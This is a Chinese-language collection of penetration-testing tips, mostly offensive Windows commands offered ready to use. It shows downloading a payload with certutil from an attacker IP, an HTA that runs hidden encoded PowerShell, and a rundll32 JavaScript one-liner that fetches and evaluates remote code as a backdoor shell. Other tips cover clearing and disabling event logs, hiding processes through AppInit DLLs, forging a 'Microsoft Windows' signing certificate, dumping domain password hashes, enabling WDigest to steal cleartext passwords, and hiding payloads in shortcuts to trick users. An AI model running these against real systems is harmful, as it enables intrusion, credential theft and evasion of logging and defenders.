# Pentest-and-Development-Tips
A collection of pentest and development tips

---

### Tips 1. 手动端口探测

nmap的-sV可以探测出服务版本，但有些情况下必须手动探测去验证

使用Wireshark获取响应包未免大材小用，可通过nc简单判断

eg.


对于8001端口，nc连接上去，随便输入一个字符串，得到了以下结果：

```
$ nc -vv localhost 8001  
localhost [127.0.0.1] 8001 (?) open
asd
HTTP/1.1 400 Bad Request
Date: Fri, 25 Aug 2017 12:15:25 GMT
Server: Apache/2.4.23 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.23 (Debian) Server at 127.0.0.1 Port 8001</address>
</body></html>
```

由此我们知道了这是一个http服务，因为我们发送的字符串不是一个合法的HTTP请求，因此返回一个400 Bad requests，我们还得到了系统的版本是Debian，WebServer是Apache

参考： 

[《谈谈端口探测的经验与原理》](http://www.freebuf.com/articles/network/146087.html)


---

### Tips 2. Windows系统从Kali下载文件

Kali:

```
python -m SimpleHTTPServer 80
```

Windows:

```
certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe
certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
```
参考： 

[《渗透测试中的certutil.exe》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/)

---

### Tips 3. 配置工作组计算机,使其支持net use远程连接

添加用户：

```
net user test test /add
net localgroup administrators test /add
```

修改注册表，使其支持远程连接：

```
reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
```

net use远程连接：

```
net use \\192.168.1.195 test /u:test
```

---

### Tips 4. Windwos日志清除

获取日志分类列表：

```
wevtutil el >1.txt
```

获取单个日志类别的统计信息：

eg.

```
wevtutil gli "windows powershell"
```

回显：

```
creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
```

查看指定日志的具体内容：

```
wevtutil qe /f:text "windows powershell"
```

删除单个日志类别的所有信息：

```
wevtutil cl "windows powershell"
```

参考： 

[《渗透技巧-Windows日志的删除与绕过》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/)

---

### Tips 5. 破坏Windows日志记录功能

通过调用TerminateThread结束实现日志功能的线程，使得日志记录功能失效，但Windows Event Log服务没有被破坏，状态仍为正在运行

Powershell:

https://github.com/hlldz/Invoke-Phant0m

C++:

https://github.com/3gstudent/Windwos-EventLog-Bypass

参考： 

[《渗透技巧-Windows日志的删除与绕过》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/)

[《利用API-NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/)


---

### Tips 6. Win7和Windows Server 2008 R2下的进程隐藏

利用globalAPIhooks，通过修改注册表实现

下载工程：https://github.com/subTee/AppInitGlobalHooks-Mimikatz

修改代码指定要隐藏的程序名cldr.exe，编译成cldr.dll，cldr.dll放在`C:\ProgramData\Microsoft\HelpLibrary\`

管理员权限：

```
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\ProgramData\\Microsoft\\HelpLibrary\\cldr.dll" /f
```

此时，任务管理器进程列表不存在cldr.exe，Process Explorer不存在cldr.exe，Tasklist.exe不存在cldr.exe

对于64位系统：

管理员权限：

```
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\ProgramData\\Microsoft\\HelpLibrary\\cldrx64.dll" /f
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "hklm\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\ProgramData\\Microsoft\\HelpLibrary\\cldr.dll" /f
```

参考： 

[《利用globalAPIhooks在Win7系统下隐藏进程》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7%B3%BB%E7%BB%9F%E4%B8%8B%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/)

---

### Tips 7. 同名exe和com文件执行顺序

如果一个路径下同时包含同名的exe和com文件，例如test.exe和test.com，通过命令行cmd输入test(不包含文件后缀名)，会优先运行com文件，即test.com

而COM文件的生成只需要把exe文件的后缀名改为com即可

参考： 

《A dirty way of tricking users to bypass UAC》

---

### Tips 8. Windows系统证书生成与注册

证书生成与签名：

```
makecert -n "CN=Microsoft Windows" -r -sv Root.pvk Root.cer -b 01/30/2016 -e 01/01/2019
cert2spc Root.cer Root.spc
pvk2pfx -pvk Root.pvk -pi test -spc Root.spc -pfx Root.pfx -f
signtool sign /f Root.pfx /p test test.exe
```

执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件，test.exe被加上数字签名


证书注册：

管理员权限cmd，将证书添加到localmachine：

```
certmgr.exe -add -c RootIssuer.cer -s -r localmachine root
certmgr.exe -add -c ChildSubject.cer -s -r localmachine root
```

参考： 

《A dirty way of tricking users to bypass UAC》

---

### Tips 9.  hta执行vbs，加载powershell

test.hta：

```
<HTML> 
<HEAD> 
<script language="VBScript">
    Set WshShell = CreateObject("WScript.Shell")
    Connect="powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA=="
    WshShell.Run Connect, 4, true
</script>
<HTA:APPLICATION ID="test"
WINDOWSTATE = "minimize">
</HEAD> 
<BODY> 
</BODY> 
</HTML> 
```

参考： 

《Bypass McAfee Application Control——Code Execution》

---

### Tips 10. 通过c#编写dll & 通过rundll32.exe或者regsvr32加载dll

默认情况下，c#不可以声明导出函数，但可通过添加UnmanagedExports实现

当然，通过c#编写的dll，dll需要在对应版本的.NET环境才能正常运行，通过c++编写的dll更加通用

通过rundll32.exe或者regsvr32能够加载dll，但要求dll包含特定的导出函数


参考： 

《Code Execution of Regsvr32.exe》

---

### Tips 11. Windows下cpl文件介绍

本质上是DLL文件，后缀名为cpl，包含一个导出函数CPLApplet(c实现可不指定)

执行方法：

(1)双击直接运行

(2)cmd：

```
rundll32 shell32.dll,Control_RunDLL test.cpl
```

(3)cmd:

```
control test.cpl
```

(4)vbs:

```
Dim obj
Set obj = CreateObject("Shell.Application")
obj.ControlPanelItem("test.cpl")
```

(5)js:

```
var a = new ActiveXObject("Shell.Application");
a.ControlPanelItem("c:\\test\\test.cpl");
```

参考：

《CPL文件利用介绍》

---

### Tips 12. Windows下通过cmd调用rundll32执行一段代码弹回Shell

Server:

https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1

Client:

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

当然，该RAT工具还可通过以下方法加载：

vbs，js，exe，dll，shellcode

参考：

《JavaScript Backdoor》

《JavaScript Phishing》

---

### Tips 13. 可通过内存dump还原出putty&pageant的密钥

windows和Linux均适用

参考：

《Memory Dump利用实例》

---

### Tips 14. 针对Visual Studio的钓鱼利用

Visual C++：
- 修改.vcxproj文件

Visual Basic：
- 修改.vbproj文件

Visual F#：
- 修改.fsproj文件

使用Visual Studio对以上任一工程编译时，能够执行任意代码

参考：

《Pay close attention to your download code——Visual Studio trick to run code when building》

---

### Tips 15. 32位程序在64位Windows系统下执行的时候，如果有对注册表和文件的操作，存在重定向

对注册表操作：

访问HKLM\Software\的实际路径为HKLM\Software\Wow6432Node\

对文件操作：

访问c:\windows\Sysnative\ 的实际路径为 c:\windows\system32\
访问c:\windows\system32\ 的实际路径为 c:\windows\SysWOW64\

参考：

《关于32位程序在64位系统下运行中需要注意的重定向问题》

---

### Tips 16. 获取Windows域控所有用户hash

方法1：

复制ntds.dit：

使用NinjaCopy，https://github.com/3gstudent/NinjaCopy

导出hash：

使用quarkspwdump，https://github.com/quarkslab/quarkspwdump

```
esentutl /p /o ntds.dit
QuarksPwDump.exe -dhb -hist -nt c：\test\ntds.dit -o c：\test\log.txt
```

方法2：

使用powershell：DSInternals PowerShell Module

https://www.dsinternals.com/wp-content/uploads/DSInternals_v2.8.zip

适用条件：

Windows PowerShell 3.0 or 3.0+

.NET Framework 4.0 or 4.0+

参考：

《导出当前域内所有用户hash的技术整理》

《利用Powershell快速导出域控所有用户Hash》

---

### Tips 17. 导出Windows系统明文口令

Windows Server 2012默认无法使用mimikatz导出明文口令，部分Windows Server 2008也一样

解决方法：启用Wdigest Auth

cmd:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

or

powershell:

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
```

重启或者用户再次登录，能够导出明文口令

参考：

《域渗透——Dump Clear-Text Password after KB2871997 installed》

---

### Tips 18. 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码

当然，可选择保存在本地或是将密码上传至服务器

参考：

《域渗透——Hook PasswordChangeNotify》

---

### Tips 19. 在域渗透时要记得留意域内主机的本地管理员账号

如果管理员疏忽，域内主机使用相同的本地管理员账号，可以通过pass-the-hash远程登录域内其他主机

参考：

《域渗透——Local Administrator Password Solution》

---

### Tips 20. 通过powershell获取dll的导出函数

https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1

Get-Exports -DllPath c:\Windows\system32\dimsjob.dll -ExportsToCpp C:\test\export.txt

参考：

[《Study Notes Weekly No.3(Use odbcconf to load dll & Get-Exports & ETW USB Keylogger)》](https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.3(Use-odbcconf-to-load-dll-&-Get-Exports-&-ETW-USB-Keylogger)/)

---

### Tips 21. 快捷方式的参数隐藏技巧

将payload放置在260个空字符之后 这样无法在文件属性查看payload，可以用来在快捷方式中隐藏payload，欺骗用户点击，隐蔽执行代码

参考：

[《渗透技巧——快捷方式文件的参数隐藏技巧》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/)


---

### Tips 22.

